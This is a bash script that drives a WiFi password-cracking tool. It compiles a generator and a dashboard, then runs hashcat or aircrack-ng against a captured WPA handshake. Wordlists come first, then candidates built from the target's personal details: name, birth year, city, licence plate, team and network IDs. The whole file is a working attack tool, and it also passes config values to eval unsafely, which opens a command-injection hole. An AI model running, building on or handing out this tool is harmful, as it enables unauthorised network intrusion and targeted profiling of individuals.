#!/bin/bash

# ==============================================================================
# Pi-Cracker v6.3: CONTROLLER & ENGINE (CLEAN BUILD)
# ==============================================================================

# --- Configuration ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
cd "$SCRIPT_DIR" || exit 1

ENGINE_SRC="pi_generator_dynamic.c"
ENGINE_BIN="./pi_generator_dynamic"
UI_SRC="pi_ui.c"
UI_BIN="./pi_ui"
WORDLIST_DIR="../Wordlist"

# TEMP DIRECTORY SETUP
TMP_DIR="/tmp/pi_temp"
mkdir -p "$TMP_DIR"

CONFIG_FILE="$TMP_DIR/pi_config.env"
SIGNAL_START="$TMP_DIR/pi_start.signal"
SIGNAL_STOP="$TMP_DIR/pi_stop.signal"
STATUS_FILE="$TMP_DIR/pi_status.txt"
PASS_STATUS_FILE="$TMP_DIR/pi_current_pass.txt"
LOG_FILE="$TMP_DIR/attack.log"
CRACKED_KEY="$TMP_DIR/cracked.key"

# --- Colors ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- 1. Setup & Compile ---
# Clear old signals and temporary files
rm -rf "$TMP_DIR"/*

echo -e "${YELLOW}[*] Compiling Attack Engine...${NC}"
gcc "$ENGINE_SRC" -o "$ENGINE_BIN" -lmpfr -lgmp || { echo -e "${RED}[!] Engine compile failed.${NC}"; exit 1; }

echo -e "${YELLOW}[*] Compiling Interface...${NC}"
gcc "$UI_SRC" -o "$UI_BIN" -lraylib -lGL -lm -lpthread -ldl -lrt -lX11 || { echo -e "${RED}[!] UI compile failed. Install raylib (libraylib-dev).${NC}"; exit 1; }

# --- 2. Launch UI in Background ---
echo -e "${GREEN}[*] Launching Dashboard...${NC}"
$UI_BIN &
UI_PID=$!

# Function to cleanup on exit
cleanup() {
    echo -e "\n${RED}[!] Shutting down...${NC}"
    kill $UI_PID 2>/dev/null
    pkill -P $$ # Kill child processes (hashcat/aircrack)
    echo -e "${YELLOW}[*] Cleaning up temporary files...${NC}"
    rm -rf "$TMP_DIR"
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT

# --- 3. Wait for Start Signal ---
echo -e "${CYAN}[*] Waiting for user configuration...${NC}"
while [ ! -f "$SIGNAL_START" ]; do
    if ! kill -0 $UI_PID 2>/dev/null; then
        echo -e "${RED}[!] UI closed unexpectedly.${NC}"
        exit 1
    fi
    if [ -f "$SIGNAL_STOP" ]; then exit 0; fi
    sleep 0.5
done

# --- 4. Load Config & Initialize ---
source "$CONFIG_FILE"
echo "PHASE=Initializing" > "$STATUS_FILE"
echo "CYCLE=0" >> "$STATUS_FILE"

# Determine Mode
MODE="aircrack"
if [ "$UI_ATTACK_MODE" == "1" ]; then MODE="hashcat";
elif [ "$UI_ATTACK_MODE" == "2" ]; then MODE="aircrack";
elif [ "$UI_ATTACK_MODE" == "0" ]; then
    if [[ "$TARGET_FILE" == *".hc22000" ]]; then MODE="hashcat"; else MODE="aircrack"; fi
fi

# Check tools
if [ "$MODE" == "hashcat" ] && ! command -v hashcat &> /dev/null; then MODE="aircrack"; fi

# Determine Password Length (Default to 8 if empty)
PASS_LEN=${TARGET_PASS_LEN:-8}

# --- 5. Phase 0: Wordlist Attack ---
echo "PHASE=Wordlist Attack" > "$STATUS_FILE"
echo "CYCLE=0" >> "$STATUS_FILE"

for wordlist in "$WORDLIST_DIR"/*.txt; do
    if [ -f "$wordlist" ]; then
        if [ "$MODE" == "hashcat" ]; then
            hashcat -m 22000 -a 0 "$TARGET_FILE" "$wordlist" --session pi_hybrid --status --status-timer 1 > "$LOG_FILE" 2>&1
            if [ $? -eq 0 ]; then
                hashcat -m 22000 -a 0 "$TARGET_FILE" --show > "$CRACKED_KEY"
                wait $UI_PID
                exit 0
            fi
        else
            aircrack-ng -w "$wordlist" "$TARGET_FILE" -l "$CRACKED_KEY" > "$LOG_FILE" 2>&1
            if [ -f "$CRACKED_KEY" ]; then
                wait $UI_PID
                exit 0
            fi
        fi
    fi
done

# --- 6. Phase 1: Dynamic Pi Attack ---
GEN_ARGS="--name \"$TARGET_NAME\" --surname \"$TARGET_SURNAME\" --year \"$TARGET_YEAR\" --city \"$TARGET_CITY\" --plate \"$TARGET_PLATE\" --team \"$TARGET_TEAM\" --essid \"$TARGET_ESSID\" --bssid \"$TARGET_BSSID\""

cycle=1
while true; do
    if [ -f "$SIGNAL_STOP" ] || ! kill -0 $UI_PID 2>/dev/null; then break; fi
    
    echo "PHASE=Dynamic Pi Gen (Loop $cycle)" > "$STATUS_FILE"
echo "CYCLE=$cycle" >> "$STATUS_FILE"
    
    # Run a block of attacks
    if [ "$MODE" == "hashcat" ]; then
        cmd="$ENGINE_BIN $PASS_LEN 20000000 /dev/stdout $GEN_ARGS | hashcat -m 22000 -a 0 \"$TARGET_FILE\" --session pi_hybrid --status --status-timer 1"
        eval "$cmd" > "$LOG_FILE" 2>&1
        
        # Check if found
        if hashcat -m 22000 --show "$TARGET_FILE" | grep -q ":"; then
             hashcat -m 22000 -a 0 "$TARGET_FILE" --show > "$CRACKED_KEY"
             break
        fi
    else
        cmd="$ENGINE_BIN $PASS_LEN 20000000 /dev/stdout $GEN_ARGS | aircrack-ng -w - \"$TARGET_FILE\" -l \"$CRACKED_KEY\""
        eval "$cmd" > "$LOG_FILE" 2>&1
        if [ -f "$CRACKED_KEY" ]; then break; fi
    fi

    cycle=$((cycle + 1))
done

# Keep alive if successful
if [ -f "$CRACKED_KEY" ]; then
    echo "PHASE=SUCCESS" > "$STATUS_FILE"
    wait $UI_PID
else
    if [ -f "$SIGNAL_STOP" ]; then
        echo -e "${YELLOW}[!] Attack stopped by user.${NC}"
    fi
fi